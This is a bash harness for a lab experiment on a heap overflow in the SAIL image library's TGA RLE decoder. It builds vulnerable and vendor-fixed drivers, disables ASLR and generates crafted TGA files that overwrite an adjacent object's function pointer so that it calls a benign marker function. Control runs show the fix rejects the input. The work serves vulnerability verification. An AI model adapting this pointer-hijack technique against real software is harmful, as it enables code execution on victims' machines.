#!/usr/bin/env bash
# sailtga2shell w1: controlled lab experiment. A malloc interposer places a
# live pointer-bearing victim immediately after the 256-byte pixel buffer;
# crafted RLE packets write chosen dwords into victim->fp. With ASLR disabled
# the field can be retargeted to a lab benign marker by the vulnerable build.
# This is a SYNTHETIC in-process consumer: rung-4 mechanics, never r5.
set -u
cd "$(dirname "$0")/.."
ROOT="$PWD"
mkdir -p evidence-w3
ARCH=$(uname -m)

pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
need() { grep -q -- "$2" "$1" 2>/dev/null; }

VLIBS="-Wl,--start-group build-vuln-plain/src/sail/libsail.a build-vuln-plain/src/sail-codecs-archive/libsail-codecs.a build-vuln-plain/src/sail-common/libsail-common.a build-vuln-plain/src/sail-manip/libsail-manip.a -Wl,--end-group"
FLIBS="-Wl,--start-group build-fixed-plain/src/sail/libsail.a build-fixed-plain/src/sail-codecs-archive/libsail-codecs.a build-fixed-plain/src/sail-common/libsail-common.a build-fixed-plain/src/sail-manip/libsail-manip.a -Wl,--end-group"

echo "== build interposer and both drivers =="
gcc -shared -fPIC -O0 -g -o evidence-w3/victim_preload.so harness/victim_preload.c \
    2> evidence-w3/compile-preload.log && ok "compile malloc interposer" || bad "compile malloc interposer"
gcc -g -O0 -ldl -I sail-0.9.10/src -I build-vuln-plain/include harness/pointer-driver.c \
    $VLIBS -lm -o evidence-w3/pointer-driver 2> evidence-w3/compile-driver.log \
    && ok "compile pointer driver (vulnerable plain)" || bad "compile vulnerable driver"
gcc -g -O0 -ldl -I stubs -I sail-1.0.0/src -I build-fixed-plain/include harness/pointer-driver.c \
    $FLIBS -lm -o evidence-w3/pointer-driver-fixed 2> evidence-w3/compile-fixed.log \
    && ok "compile pointer driver (vendor-fixed plain)" || bad "compile fixed driver"

PRELOAD="$ROOT/evidence-w3/victim_preload.so"
run_victim() {
    setarch "$ARCH" -R env SAIL_VICTIM_ARM=1 LD_PRELOAD="$PRELOAD" \
        ./$1 "$2" > "$3" 2>&1
}
run_with_call() {
    rm -f evidence-w3/marker.txt
    setarch "$ARCH" -R env SAIL_VICTIM_ARM=1 SAIL_VICTIM_CALL=1 LD_PRELOAD="$PRELOAD" \
        ./$1 "$2" > "$3" 2>&1
}

echo "== measure live victim placement and marker addresses =="
run_victim evidence-w3/pointer-driver evidence/attack.tga evidence-w3/measure.out
need evidence-w3/measure.out 'VICTIM pixel=' || bad "interposer placed a victim"
delta=$(sed -n 's/.*delta=\([0-9]*\).*/\1/p' evidence-w3/measure.out)
marker=$(sed -n 's/.*marker=\(0x[0-9a-f]*\).*/\1/p' evidence-w3/measure.out)
if [ -n "$delta" ] && [ $((delta % 4)) -eq 0 ] && [ "$delta" -ge 256 ]; then
    ok "victim live delta=$delta bytes after pixel buffer"
else
    bad "usable victim delta (got '${delta:-none}')"
fi
if [ -n "$marker" ]; then ok "benign marker address stable under disabled ASLR ($marker)"; else bad "marker address"; fi
index=$((delta / 4))
echo "victim_index=$index marker=$marker"

echo "== targeted dword write into the live victim's pointer field =="
python3 harness/make-pointer-poc.py evidence-w3/pointer.tga "$index" 00414243 00007f00 \
    > evidence-w3/gen.log 2>&1 && ok "generate targeted 4-byte-stride TGA" || bad "generate targeted TGA"
cat evidence-w3/gen.log
run_victim evidence-w3/pointer-driver evidence-w3/pointer.tga evidence-w3/pointer.out
need evidence-w3/pointer.out 'rc=0' && ok "vulnerable build decodes targeted input" || bad "vulnerable decodes targeted input"
if need evidence-w3/pointer.out 'fp=0x7f0000414243'; then
    ok "victim pointer field controlled to chosen canonical value 0x00007f0000414243"
else
    bad "victim pointer field controlled to chosen value"
fi

echo "== retarget the field to a lab benign marker and call it =="
low=$(printf '%08x' $((marker & 0xffffffff)))
high=$(printf '%08x' $((marker >> 32)))
python3 harness/make-pointer-poc.py evidence-w3/marker.tga "$index" "$low" "$high" \
    > evidence-w3/gen-marker.log 2>&1 && ok "generate marker-addressed TGA" || bad "generate marker TGA"
cat evidence-w3/gen-marker.log
run_with_call evidence-w3/pointer-driver evidence-w3/marker.tga evidence-w3/marker.out
if need evidence-w3/marker.out 'BENIGN_MARKER_EXECUTED' && [ -f evidence-w3/marker.txt ]; then
    ok "retargeted pointer executes lab benign marker (observed side effect)"
else
    bad "retargeted pointer executes lab benign marker"
fi
cp evidence-w3/marker.txt evidence-w3/marker-side-effect.txt 2>/dev/null || true
need evidence-w3/marker.out "fp=$marker" \
    && ok "called pointer equals discovered marker address under disabled ASLR" \
    || bad "called pointer equals marker address"

echo "== controls: matching stride and vendor fix leave the field alone =="
run_with_call evidence-w3/pointer-driver evidence/safe8.tga evidence-w3/safe.out
if need evidence-w3/safe.out 'CONTROL_FP_UNCHANGED' && [ ! -f evidence-w3/marker.txt ]; then
    ok "matching-stride safe8 does not retarget the field"
else
    bad "matching-stride safe8 does not retarget the field"
fi
run_with_call evidence-w3/pointer-driver-fixed evidence-w3/marker.tga evidence-w3/fixed.out
if need evidence-w3/fixed.out 'rc=213' \
   && need evidence-w3/fixed.out 'VICTIM none' \
   && [ ! -f evidence-w3/marker.txt ]; then
    ok "vendor-fixed v1.0.0 rejects input; no victim or marker execution"
else
    bad "vendor-fixed v1.0.0 control"
fi

echo "PTR_PASS=$pass PTR_FAIL=$fail"
[ "$fail" -eq 0 ] && exit 0 || exit 1
